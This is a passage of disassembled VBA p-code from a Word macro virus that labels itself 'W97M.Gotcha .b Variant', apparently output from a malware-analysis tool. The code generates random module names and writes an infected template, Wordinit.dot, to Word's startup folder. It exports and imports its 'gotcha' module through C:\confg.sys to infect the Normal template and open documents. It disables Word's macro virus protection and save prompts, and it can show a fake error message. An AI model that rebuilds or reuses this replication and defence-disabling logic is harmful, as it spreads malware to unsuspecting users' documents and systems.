' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "P"
' 	St C$ 
' 	EndIf 
' Line #492:
' 	Ld s 
' 	LitDI2 0x0011 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "Q"
' 	St C$ 
' 	EndIf 
' Line #493:
' 	Ld s 
' 	LitDI2 0x0012 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "R"
' 	St C$ 
' 	EndIf 
' Line #494:
' 	Ld s 
' 	LitDI2 0x0013 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "S"
' 	St C$ 
' 	EndIf 
' Line #495:
' 	Ld s 
' 	LitDI2 0x0014 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "T"
' 	St C$ 
' 	EndIf 
' Line #496:
' 	Ld s 
' 	LitDI2 0x0015 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "U"
' 	St C$ 
' 	EndIf 
' Line #497:
' 	Ld s 
' 	LitDI2 0x0016 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "V"
' 	St C$ 
' 	EndIf 
' Line #498:
' 	Ld s 
' 	LitDI2 0x0017 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "W"
' 	St C$ 
' 	EndIf 
' Line #499:
' 	Ld s 
' 	LitDI2 0x0018 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "s"
' 	St C$ 
' 	EndIf 
' Line #500:
' 	Ld s 
' 	LitDI2 0x0019 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "Y"
' 	St C$ 
' 	EndIf 
' Line #501:
' 	Ld s 
' 	LitDI2 0x001A 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "Z"
' 	St C$ 
' 	EndIf 
' Line #502:
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x001A 
' 	Mul 
' 	FnInt 
' 	St q 
' Line #503:
' 	Ld q 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "A"
' 	St D$ 
' 	EndIf 
' Line #504:
' 	Ld q 
' 	LitDI2 0x0002 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "B"
' 	St D$ 
' 	EndIf 
' Line #505:
' 	Ld q 
' 	LitDI2 0x0003 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "C"
' 	St D$ 
' 	EndIf 
' Line #506:
' 	Ld q 
' 	LitDI2 0x0004 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "D"
' 	St D$ 
' 	EndIf 
' Line #507:
' 	Ld q 
' 	LitDI2 0x0005 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "E"
' 	St D$ 
' 	EndIf 
' Line #508:
' 	Ld q 
' 	LitDI2 0x0006 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "F"
' 	St D$ 
' 	EndIf 
' Line #509:
' 	Ld q 
' 	LitDI2 0x0007 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "G"
' 	St D$ 
' 	EndIf 
' Line #510:
' 	Ld q 
' 	LitDI2 0x0008 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "H"
' 	St D$ 
' 	EndIf 
' Line #511:
' 	Ld q 
' 	LitDI2 0x0009 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "I"
' 	St D$ 
' 	EndIf 
' Line #512:
' 	Ld q 
' 	LitDI2 0x000A 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "J"
' 	St D$ 
' 	EndIf 
' Line #513:
' 	Ld q 
' 	LitDI2 0x000B 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "K"
' 	St D$ 
' 	EndIf 
' Line #514:
' 	Ld q 
' 	LitDI2 0x000C 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "L"
' 	St D$ 
' 	EndIf 
' Line #515:
' 	Ld q 
' 	LitDI2 0x000D 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "M"
' 	St D$ 
' 	EndIf 
' Line #516:
' 	Ld q 
' 	LitDI2 0x000E 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "N"
' 	St D$ 
' 	EndIf 
' Line #517:
' 	Ld q 
' 	LitDI2 0x000F 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "O"
' 	St D$ 
' 	EndIf 
' Line #518:
' 	Ld q 
' 	LitDI2 0x0010 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "P"
' 	St D$ 
' 	EndIf 
' Line #519:
' 	Ld q 
' 	LitDI2 0x0011 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "Q"
' 	St D$ 
' 	EndIf 
' Line #520:
' 	Ld q 
' 	LitDI2 0x0012 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "R"
' 	St D$ 
' 	EndIf 
' Line #521:
' 	Ld q 
' 	LitDI2 0x0013 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "S"
' 	St D$ 
' 	EndIf 
' Line #522:
' 	Ld q 
' 	LitDI2 0x0014 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "T"
' 	St D$ 
' 	EndIf 
' Line #523:
' 	Ld q 
' 	LitDI2 0x0015 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "U"
' 	St D$ 
' 	EndIf 
' Line #524:
' 	Ld q 
' 	LitDI2 0x0016 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "V"
' 	St D$ 
' 	EndIf 
' Line #525:
' 	Ld q 
' 	LitDI2 0x0017 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "W"
' 	St D$ 
' 	EndIf 
' Line #526:
' 	Ld q 
' 	LitDI2 0x0018 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "X"
' 	St D$ 
' 	EndIf 
' Line #527:
' 	Ld q 
' 	LitDI2 0x0019 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "Y"
' 	St D$ 
' 	EndIf 
' Line #528:
' 	Ld q 
' 	LitDI2 0x001A 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "Z"
' 	St D$ 
' 	EndIf 
' Line #529:
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x001A 
' 	Mul 
' 	FnInt 
' 	St w 
' Line #530:
' 	Ld w 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "A"
' 	St E$ 
' 	EndIf 
' Line #531:
' 	Ld w 
' 	LitDI2 0x0002 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "B"
' 	St E$ 
' 	EndIf 
' Line #532:
' 	Ld w 
' 	LitDI2 0x0003 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "C"
' 	St E$ 
' 	EndIf 
' Line #533:
' 	Ld w 
' 	LitDI2 0x0004 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "D"
' 	St E$ 
' 	EndIf 
' Line #534:
' 	Ld w 
' 	LitDI2 0x0005 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "E"
' 	St E$ 
' 	EndIf 
' Line #535:
' 	Ld w 
' 	LitDI2 0x0006 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "F"
' 	St E$ 
' 	EndIf 
' Line #536:
' 	Ld w 
' 	LitDI2 0x0007 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "G"
' 	St E$ 
' 	EndIf 
' Line #537:
' 	Ld w 
' 	LitDI2 0x0008 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "H"
' 	St E$ 
' 	EndIf 
' Line #538:
' 	Ld w 
' 	LitDI2 0x0009 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "I"
' 	St E$ 
' 	EndIf 
' Line #539:
' 	Ld w 
' 	LitDI2 0x000A 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "J"
' 	St E$ 
' 	EndIf 
' Line #540:
' 	Ld w 
' 	LitDI2 0x000B 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "K"
' 	St E$ 
' 	EndIf 
' Line #541:
' 	Ld w 
' 	LitDI2 0x000C 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "L"
' 	St E$ 
' 	EndIf 
' Line #542:
' 	Ld w 
' 	LitDI2 0x000D 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "M"
' 	St E$ 
' 	EndIf 
' Line #543:
' 	Ld w 
' 	LitDI2 0x000E 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "N"
' 	St E$ 
' 	EndIf 
' Line #544:
' 	Ld w 
' 	LitDI2 0x000F 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "O"
' 	St E$ 
' 	EndIf 
' Line #545:
' 	Ld w 
' 	LitDI2 0x0010 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "P"
' 	St E$ 
' 	EndIf 
' Line #546:
' 	Ld w 
' 	LitDI2 0x0011 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "Q"
' 	St E$ 
' 	EndIf 
' Line #547:
' 	Ld w 
' 	LitDI2 0x0012 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "R"
' 	St E$ 
' 	EndIf 
' Line #548:
' 	Ld w 
' 	LitDI2 0x0013 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "S"
' 	St E$ 
' 	EndIf 
' Line #549:
' 	Ld w 
' 	LitDI2 0x0014 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "T"
' 	St E$ 
' 	EndIf 
' Line #550:
' 	Ld w 
' 	LitDI2 0x0015 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "U"
' 	St E$ 
' 	EndIf 
' Line #551:
' 	Ld w 
' 	LitDI2 0x0016 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "V"
' 	St E$ 
' 	EndIf 
' Line #552:
' 	Ld w 
' 	LitDI2 0x0017 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "W"
' 	St E$ 
' 	EndIf 
' Line #553:
' 	Ld w 
' 	LitDI2 0x0018 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "X"
' 	St E$ 
' 	EndIf 
' Line #554:
' 	Ld w 
' 	LitDI2 0x0019 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "Y"
' 	St E$ 
' 	EndIf 
' Line #555:
' 	Ld w 
' 	LitDI2 0x001A 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "Z"
' 	St E$ 
' 	EndIf 
' Line #556:
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x001A 
' 	Mul 
' 	FnInt 
' 	St y 
' Line #557:
' 	Ld y 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "A"
' 	St False$ 
' 	EndIf 
' Line #558:
' 	Ld y 
' 	LitDI2 0x0002 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "B"
' 	St False$ 
' 	EndIf 
' Line #559:
' 	Ld y 
' 	LitDI2 0x0003 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "C"
' 	St False$ 
' 	EndIf 
' Line #560:
' 	Ld y 
' 	LitDI2 0x0004 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "D"
' 	St False$ 
' 	EndIf 
' Line #561:
' 	Ld y 
' 	LitDI2 0x0005 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "E"
' 	St False$ 
' 	EndIf 
' Line #562:
' 	Ld y 
' 	LitDI2 0x0006 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "F"
' 	St False$ 
' 	EndIf 
' Line #563:
' 	Ld y 
' 	LitDI2 0x0007 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "G"
' 	St False$ 
' 	EndIf 
' Line #564:
' 	Ld y 
' 	LitDI2 0x0008 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "H"
' 	St False$ 
' 	EndIf 
' Line #565:
' 	Ld y 
' 	LitDI2 0x0009 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "I"
' 	St False$ 
' 	EndIf 
' Line #566:
' 	Ld y 
' 	LitDI2 0x000A 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "J"
' 	St False$ 
' 	EndIf 
' Line #567:
' 	Ld y 
' 	LitDI2 0x000B 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "K"
' 	St False$ 
' 	EndIf 
' Line #568:
' 	Ld y 
' 	LitDI2 0x000C 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "L"
' 	St False$ 
' 	EndIf 
' Line #569:
' 	Ld y 
' 	LitDI2 0x000D 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "M"
' 	St False$ 
' 	EndIf 
' Line #570:
' 	Ld y 
' 	LitDI2 0x000E 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "N"
' 	St False$ 
' 	EndIf 
' Line #571:
' 	Ld y 
' 	LitDI2 0x000F 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "O"
' 	St False$ 
' 	EndIf 
' Line #572:
' 	Ld y 
' 	LitDI2 0x0010 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "P"
' 	St False$ 
' 	EndIf 
' Line #573:
' 	Ld y 
' 	LitDI2 0x0011 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "Q"
' 	St False$ 
' 	EndIf 
' Line #574:
' 	Ld y 
' 	LitDI2 0x0012 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "R"
' 	St False$ 
' 	EndIf 
' Line #575:
' 	Ld y 
' 	LitDI2 0x0013 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "S"
' 	St False$ 
' 	EndIf 
' Line #576:
' 	Ld y 
' 	LitDI2 0x0014 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "T"
' 	St False$ 
' 	EndIf 
' Line #577:
' 	Ld y 
' 	LitDI2 0x0015 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "U"
' 	St False$ 
' 	EndIf 
' Line #578:
' 	Ld y 
' 	LitDI2 0x0016 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "V"
' 	St False$ 
' 	EndIf 
' Line #579:
' 	Ld y 
' 	LitDI2 0x0017 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "W"
' 	St False$ 
' 	EndIf 
' Line #580:
' 	Ld y 
' 	LitDI2 0x0018 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "X"
' 	St False$ 
' 	EndIf 
' Line #581:
' 	Ld y 
' 	LitDI2 0x0019 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "Y"
' 	St False$ 
' 	EndIf 
' Line #582:
' 	Ld y 
' 	LitDI2 0x001A 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "Z"
' 	St False$ 
' 	EndIf 
' Line #583:
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x001A 
' 	Mul 
' 	FnInt 
' 	St t 
' Line #584:
' 	Ld t 
' 	LitDI2 0x0001 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "A"
' 	St G$ 
' 	EndIf 
' Line #585:
' 	Ld t 
' 	LitDI2 0x0002 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "B"
' 	St G$ 
' 	EndIf 
' Line #586:
' 	Ld t 
' 	LitDI2 0x0003 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "C"
' 	St G$ 
' 	EndIf 
' Line #587:
' 	Ld t 
' 	LitDI2 0x0004 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "D"
' 	St G$ 
' 	EndIf 
' Line #588:
' 	Ld t 
' 	LitDI2 0x0005 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "E"
' 	St G$ 
' 	EndIf 
' Line #589:
' 	Ld t 
' 	LitDI2 0x0006 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "F"
' 	St G$ 
' 	EndIf 
' Line #590:
' 	Ld t 
' 	LitDI2 0x0007 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "G"
' 	St G$ 
' 	EndIf 
' Line #591:
' 	Ld t 
' 	LitDI2 0x0008 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "H"
' 	St G$ 
' 	EndIf 
' Line #592:
' 	Ld t 
' 	LitDI2 0x0009 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "I"
' 	St G$ 
' 	EndIf 
' Line #593:
' 	Ld t 
' 	LitDI2 0x000A 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "J"
' 	St G$ 
' 	EndIf 
' Line #594:
' 	Ld t 
' 	LitDI2 0x000B 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "K"
' 	St G$ 
' 	EndIf 
' Line #595:
' 	Ld t 
' 	LitDI2 0x000C 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "L"
' 	St G$ 
' 	EndIf 
' Line #596:
' 	Ld t 
' 	LitDI2 0x000D 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "M"
' 	St G$ 
' 	EndIf 
' Line #597:
' 	Ld t 
' 	LitDI2 0x000E 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "N"
' 	St G$ 
' 	EndIf 
' Line #598:
' 	Ld t 
' 	LitDI2 0x000F 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "O"
' 	St G$ 
' 	EndIf 
' Line #599:
' 	Ld t 
' 	LitDI2 0x0010 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "P"
' 	St G$ 
' 	EndIf 
' Line #600:
' 	Ld t 
' 	LitDI2 0x0011 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "Q"
' 	St G$ 
' 	EndIf 
' Line #601:
' 	Ld t 
' 	LitDI2 0x0012 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "R"
' 	St G$ 
' 	EndIf 
' Line #602:
' 	Ld t 
' 	LitDI2 0x0013 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "S"
' 	St G$ 
' 	EndIf 
' Line #603:
' 	Ld t 
' 	LitDI2 0x0014 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "T"
' 	St G$ 
' 	EndIf 
' Line #604:
' 	Ld t 
' 	LitDI2 0x0015 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "U"
' 	St G$ 
' 	EndIf 
' Line #605:
' 	Ld t 
' 	LitDI2 0x0016 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "V"
' 	St G$ 
' 	EndIf 
' Line #606:
' 	Ld t 
' 	LitDI2 0x0017 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "W"
' 	St G$ 
' 	EndIf 
' Line #607:
' 	Ld t 
' 	LitDI2 0x0018 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "X"
' 	St G$ 
' 	EndIf 
' Line #608:
' 	Ld t 
' 	LitDI2 0x0019 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "Y"
' 	St G$ 
' 	EndIf 
' Line #609:
' 	Ld t 
' 	LitDI2 0x001A 
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "Z"
' 	St G$ 
' 	EndIf 
' Line #610:
' 	Ld A$ 
' 	Ld C$ 
' 	Add 
' 	Ld D$ 
' 	Add 
' 	Ld E$ 
' 	Add 
' 	Ld False$ 
' 	Add 
' 	Ld G$ 
' 	Add 
' 	St B$ 
' Line #611:
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x000D "\Wordinit.dot"
' 	Add 
' 	ParamNamed Source 
' 	LitStr 0x0006 "gotcha"
' 	ParamNamed New 
' 	Ld B$ 
' 	ParamNamed NewName 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerRename 0x0004 
' Line #612:
' 	LineCont 0x0004 0B 00 08 00
' 	Ld Application 
' 	MemLd StartupPath 
' 	LitStr 0x000D "\Wordinit.dot"
' 	Add 
' 	ParamNamed FileName 
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	LitVarSpecial (False)
' 	ParamNamed AddToRecentFiles 
' 	LitVarSpecial (False)
' 	ParamNamed ReadOnlyRecommended 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0004 
' Line #613:
' 	Ld ActiveDocument 
' 	MemLd Saved 
' 	LitVarSpecial (False)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed FileName 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' 	EndIf 
' Line #614:
' 	Ld wdSaveChanges 
' 	ParamNamed SaveChanges 
' 	LitDI2 0x0001 
' 	ArgsLd Windows 0x0001 
' 	ArgsMemCall Close 0x0001 
' Line #615:
' 	EndIfBlock 
' Line #616:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #617:
' 	EndFunc 
' Line #618:
' 	FuncDefn (Function Trix_code())
' Line #619:
' 	OnError (Resume Next) 
' Line #620:
' 	LitStr 0x000C "C:\confg.sys"
' 	Paren 
' 	LitStr 0x0006 "gotcha"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #621:
' 	LitStr 0x000C "C:\confg.sys"
' 	Paren 
' 	LitStr 0x0006 "gotcha"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #622:
' 	LitStr 0x000C "C:\confg.sys"
' 	LitStr 0x0006 "gotcha"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #623:
' 	LitStr 0x000C "C:\confg.sys"
' 	LitStr 0x0006 "gotcha"
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #624:
' 	LitVarSpecial (False)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #625:
' 	Ld norminfd 
' 	LitVarSpecial (False)
' 	Eq 
' 	Ld Armor 
' 	LitVarSpecial (False)
' 	Eq 
' 	And 
' 	IfBlock 
' Line #626:
' 	LitStr 0x000C "C:\confg.sys"
' 	LitStr 0x0006 "gotcha"
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #627:
' 	StartWithExpr 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	With 
' Line #628:
' 	StartWithExpr 
' 	LitStr 0x000C "C:\confg.sys"
' 	MemLdWith VBComponents 
' 	ArgsMemLd Import 0x0001 
' 	With 
' Line #629:
' 	EndWith 
' Line #630:
' 	EndWith 
' Line #631:
' 	Ld NormalTemplate 
' 	ArgsMemCall Save 0x0000 
' Line #632:
' 	EndIfBlock 
' Line #633:
' 	Ld Docinfd 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #634:
' 	LitStr 0x000C "C:\confg.sys"
' 	Paren 
' 	LitStr 0x0006 "gotcha"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #635:
' 	LitStr 0x000C "C:\confg.sys"
' 	Paren 
' 	LitStr 0x0006 "gotcha"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #636:
' 	LitStr 0x000C "C:\confg.sys"
' 	LitStr 0x0006 "gotcha"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #637:
' 	LitStr 0x000C "C:\confg.sys"
' 	LitStr 0x0006 "gotcha"
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #638:
' 	StartWithExpr 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	With 
' Line #639:
' 	StartWithExpr 
' 	LitStr 0x000C "C:\confg.sys"
' 	MemLdWith VBComponents 
' 	ArgsMemLd Import 0x0001 
' 	With 
' Line #640:
' 	EndWith 
' Line #641:
' 	EndWith 
' Line #642:
' 	EndIfBlock 
' Line #643:
' 	LitVarSpecial (True)
' 	Ld Application 
' 	MemSt ScreenUpdating 
' Line #644:
' 	EndFunc 
' Line #645:
' 	FuncDefn (Function Gotcha_Payload())
' Line #646:
' 	OnError (Resume Next) 
' Line #647:
' 	LitStr 0x000C "C:\confg.sys"
' 	Paren 
' 	LitStr 0x0006 "gotcha"
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #648:
' 	LitStr 0x000C "C:\confg.sys"
' 	Paren 
' 	LitStr 0x0006 "gotcha"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #649:
' 	LitStr 0x000C "C:\confg.sys"
' 	LitStr 0x0006 "gotcha"
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #650:
' 	LitStr 0x000C "C:\confg.sys"
' 	LitStr 0x0006 "gotcha"
' 	Ld Application 
' 	MemLd VBE 
' 	MemLd ActiveVBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	ArgsMemCall Export 0x0001 
' Line #651:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #652:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #653:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt ConfirmConversions 
' Line #654:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	St DocName 
' Line #655:
' 	ArgsCall (Call) Gotcha_Main 0x0000 
' Line #656:
' 	Ld Timer 
' 	ArgsCall Read 0x0001 
' Line #657:
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x012C 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St girl 
' Line #658:
' 	Ld girl 
' 	LitDI2 0x0002 
' 	Eq 
' 	IfBlock 
' Line #659:
' 	LitStr 0x0016 "W97M.Gotcha .b Variant"
' 	LitDI2 0x0030 
' 	LitStr 0x0004 "Trix"
' 	ArgsCall MsgBox 0x0003 
' Line #660:
' 	EndIfBlock 
' Line #661:
' 	Ld girl 
' 	LitDI2 0x000D 
' 	Eq 
' 	IfBlock 
' Line #662:
' 	LitStr 0x0044 "An error has occured.  Save all documents and restart Microsoft Word"
' 	LitDI2 0x0030 
' 	LitStr 0x000E "Microsoft Word"
' 	ArgsCall MsgBox 0x0003 
